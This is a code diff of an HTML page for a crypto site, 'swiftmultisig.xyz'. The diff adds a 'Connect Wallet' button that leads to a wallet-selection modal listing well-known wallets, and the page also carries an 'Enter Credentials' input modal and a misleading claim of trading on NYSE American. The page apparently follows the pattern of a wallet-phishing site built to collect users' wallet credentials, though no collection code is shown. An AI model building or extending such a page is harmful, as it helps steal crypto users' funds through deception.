@@ -7,8 +7,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* ===== ALL CSS REMAINS THE SAME AS YOUR PREVIOUS VERSION ===== */
-        /* (copy your existing CSS from the previous working version) */
         * {
             margin: 0;
             padding: 0;
@@ -367,7 +365,7 @@
         </div>
     </div>
 
-    <!-- HOME PAGE (unchanged) -->
+    <!-- HOME PAGE -->
     <div id="homePage" class="page active">
         <div class="hero">
             <div class="hero-left">
@@ -384,6 +382,8 @@
                 <button class="btn-connect" id="heroConnectBtn" style="width: 100%;">Get Started</button>
             </div>
         </div>
+
+        <!-- Buy crypto section with Connect Wallet button added -->
         <div class="buy-crypto-section">
             <h2>Buy crypto with your local currency</h2>
             <p>Start your crypto journey using your credit/debit card, bank account, Apple Pay, or Google Pay</p>
@@ -393,13 +393,20 @@
                 <div class="payment-method"><i class="fab fa-apple"></i><span>Apple Pay</span></div>
                 <div class="payment-method"><i class="fab fa-google"></i><span>Google Pay</span></div>
             </div>
-            <button class="learn-more-btn" onclick="alert('Coming soon!')">LEARN MORE →</button>
+            <div style="display: flex; gap: 16px; justify-content: center; margin-top: 24px;">
+                <button class="btn-connect" onclick="openWalletModal()" style="background: linear-gradient(135deg, #3b82f6, #8b5cf6);">
+                    <i class="fas fa-plug"></i> Connect Wallet
+                </button>
+                <button class="learn-more-btn" onclick="alert('Coming soon!')">LEARN MORE →</button>
+            </div>
         </div>
+
         <div class="trading-section">
             <h2>Trading ON NYSE AMERICAN</h2>
             <div class="domain">swiftmultisig.xyz</div>
             <p>Your trusted platform for cryptocurrency trading, analysis, and insights.</p>
         </div>
+
         <div style="margin: 60px 0;">
             <h2 style="text-align:center; font-size:2rem; margin-bottom:40px;">Powerful Features</h2>
             <div class="feature-grid">
@@ -411,6 +418,7 @@
                 <div class="feature-card"><i class="fas fa-rocket"></i><h3>Explore dApps</h3><p>Discover and connect with the best decentralized applications.</p></div>
             </div>
         </div>
+
         <div style="margin: 60px 0;">
             <h2 style="text-align:center; font-size:2rem; margin-bottom:40px;">What Our Users Say</h2>
             <div class="testimonials-grid">
@@ -424,7 +432,7 @@
         </div>
     </div>
 
-    <!-- FEATURES PAGE (unchanged) -->
+    <!-- FEATURES PAGE -->
     <div id="featuresPage" class="page">
         <div style="padding: 60px 0;">
             <button onclick="showPage('home')" style="background: none; border: none; color: #60a5fa; cursor: pointer; margin-bottom: 40px;"><i class="fas fa-arrow-left"></i> Back to Home</button>
@@ -440,7 +448,7 @@
         </div>
     </div>
 
-    <!-- TESTIMONIALS PAGE (unchanged) -->
+    <!-- TESTIMONIALS PAGE -->
     <div id="testimonialsPage" class="page">
         <div style="padding: 60px 0;">
             <button onclick="showPage('home')" style="background: none; border: none; color: #60a5fa; cursor: pointer; margin-bottom: 40px;"><i class="fas fa-arrow-left"></i> Back to Home</button>
@@ -461,7 +469,7 @@
     </footer>
 </div>
 
-<!-- Wallet Selection Modal (8 wallets) -->
+<!-- Wallet Selection Modal -->
 <div id="walletModal" class="modal">
     <div class="modal-content">
         <div class="modal-header"><h2>Select Wallet</h2><button class="close-modal" onclick="closeWalletModal()">&times;</button></div>
@@ -470,7 +478,6 @@
             <div class="wallet-option" onclick="selectWallet('Universal Wallet')"><i class="fas fa-globe"></i><div><strong>Universal Wallet</strong><br><small>Multi-chain</small></div></div>
             <div class="wallet-option" onclick="selectWallet('MetaMask')"><i class="fab fa-ethereum"></i><div><strong>MetaMask</strong><br><small>Ethereum & EVM</small></div></div>
             <div class="wallet-option" onclick="selectWallet('Solfare')"><i class="fas fa-sun"></i><div><strong>Solfare</strong><br><small>Solana wallet</small></div></div>
-            <!-- New wallets -->
             <div class="wallet-option" onclick="selectWallet('Trust Wallet')"><i class="fas fa-check-circle"></i><div><strong>Trust Wallet</strong><br><small>Multi-chain mobile wallet</small></div></div>
             <div class="wallet-option" onclick="selectWallet('Coinbase Wallet')"><i class="fab fa-bitcoin"></i><div><strong>Coinbase Wallet</strong><br><small>Self-custody wallet</small></div></div>
             <div class="wallet-option" onclick="selectWallet('Ledger')"><i class="fas fa-usb"></i><div><strong>Ledger</strong><br><small>Hardware wallet</small></div></div>
@@ -479,7 +486,7 @@
     </div>
 </div>
 
-<!-- Credential Input Modal (unchanged) -->
+<!-- Credential Input Modal -->
 <div id="inputModal" class="input-modal">
     <div class="input-modal-content">
         <div class="modal-header"><h2 id="inputModalTitle">Enter Credentials</h2><button class="close-modal" onclick="closeInputModal()">&times;</button></div>
